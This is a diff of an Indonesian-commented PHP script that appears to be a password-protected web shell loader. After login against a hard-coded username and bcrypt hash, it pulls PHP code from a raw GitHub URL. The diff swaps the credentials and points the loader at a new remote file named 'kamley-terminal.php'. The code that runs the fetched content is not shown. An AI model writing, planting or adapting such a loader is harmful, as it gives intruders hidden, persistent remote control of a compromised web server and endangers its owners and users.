@@ -2,8 +2,8 @@
 session_start();
 
 // Tentukan username dan password hash
-$username = "root";
-$passwordHash = '$2y$10$u8.U5bdyAdV4/e9jPc5rqeOinT5GK3PQC4/C1KQPVIenlghpHZfU.'; // Hash bcrypt
+$username = "whoiskamley";
+$passwordHash = '$2y$10$vqwJiDjFVBRdi38e3eLydOSAehXFKYQqMmb8yglraPid2OzxEaaRO'; // Hash bcrypt
 
 // Cek apakah pengguna sudah login sebelumnya
 if (!isset($_SESSION['loggedin'])) {
@@ -39,7 +39,7 @@ function fetchContent($url) {
 
 // Jika sudah login, ambil konten dari URL
 if (isset($_SESSION['loggedin'])) {
-    $url = 'https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/sange-brutal.php';
+    $url = 'https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/kamley-terminal.php';
     $content = fetchContent($url);
 
     if ($content !== false) {
